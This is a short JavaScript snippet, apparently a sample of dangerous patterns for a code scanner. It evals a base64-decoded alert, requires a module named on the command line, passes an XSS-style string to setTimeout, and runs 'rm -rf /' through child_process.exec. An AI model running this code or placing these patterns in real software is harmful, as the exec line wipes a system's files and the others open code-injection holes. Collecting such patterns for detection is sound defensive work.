const cp = require('child_process');
const code = atob('YWxlcnQoMSk=');
eval(code);
const mod = require(process.argv[2]);
cp.exec('rm -rf /');
setTimeout("alert('xss')", 1000);
